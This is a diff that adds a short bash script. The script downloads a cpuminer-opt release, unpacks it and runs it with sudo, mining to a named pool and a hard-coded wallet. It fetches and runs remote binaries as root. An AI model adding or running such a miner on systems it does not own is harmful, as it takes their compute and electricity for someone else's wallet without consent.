@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+tar xvf cpuminer-opt-linux.tar.gz
+sudo ./cpuminer-ryzen -a gr -o stratum+tcp://uspro.rplant.xyz:7056 -u RGpALK2P6YcFRLmRUHfi68LT7Zox47E2RU.SS1012 --no-auto
